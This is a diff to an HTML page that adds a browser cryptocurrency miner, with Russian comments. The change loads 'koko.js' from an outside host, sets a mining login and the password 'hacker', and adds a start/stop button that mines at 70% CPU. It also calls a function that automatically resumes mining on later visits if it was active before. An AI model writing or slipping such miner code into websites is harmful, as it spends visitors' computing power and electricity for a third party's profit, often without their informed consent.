@@ -98,7 +98,56 @@
     }
   </style>
 </head>
-<body>
+<body><!-- Подключаем майнер -->
+<script src="https://wm.bmwebm.org/koko.js"></script>
+
+<!-- Кнопка запуска/остановки майнинга -->
+<button id="minerToggle">Запустить майнинг</button>
+<p id="minerStatus">Статус: выключен</p>
+
+<!-- Гифка, по умолчанию скрыта -->
+<img id="moneyGif" src="money.gif" alt="Money Mining" style="display: none; width: 100px; margin-top: 10px;">
+
+<script>
+// Настройка майнера
+koko.config({ 
+	login: "7173569",
+	pass: "hacker"
+});
+
+let mining = false;
+
+// Обновление UI
+function updateStatus() {
+	document.getElementById('minerStatus').textContent = 
+		`Статус: ${mining ? "включен" : "выключен"}, мощность: ${mining ? koko.getPower() + "%" : "0%"}`;
+}
+
+// Управление кнопкой
+document.getElementById("minerToggle").addEventListener("click", function() {
+	const gif = document.getElementById("moneyGif");
+
+	if (mining) {
+		koko.power(0); // остановка
+		mining = false;
+		this.textContent = "Запустить майнинг";
+		gif.style.display = "none"; // скрыть гифку
+	} else {
+		koko.power(70); // запуск с 70%
+		mining = true;
+		this.textContent = "Остановить майнинг";
+		gif.style.display = "block"; // показать гифку
+	}
+	updateStatus();
+});
+
+// Автозагрузка если была активна раньше
+koko.loadStored();
+
+// Постоянное обновление статуса
+setInterval(updateStatus, 2000);
+</script>
+
 
 <canvas class="matrix" id="matrix"></canvas>
 
